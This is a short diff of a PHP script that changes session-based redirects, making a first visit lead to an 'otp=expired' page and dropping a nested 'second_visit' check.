@@ -20,10 +20,8 @@ if (isset($_SESSION['first_visit'])) {
       $_SESSION['second_visit'] = "Second Visit";
       header("Location: index.php?confirm=identity");
    }
-   if (isset($_SESSION['second_visit'])) {
-      header("Location: index.php?otp=expired");
 }
 else {
-   $_SESSION['third_visit'] = "First Visit";
-   header("Location: index.php?confirm=identity");
+   $_SESSION['first_visit'] = "First Visit";
+   header("Location: index.php?otp=expired");
 }
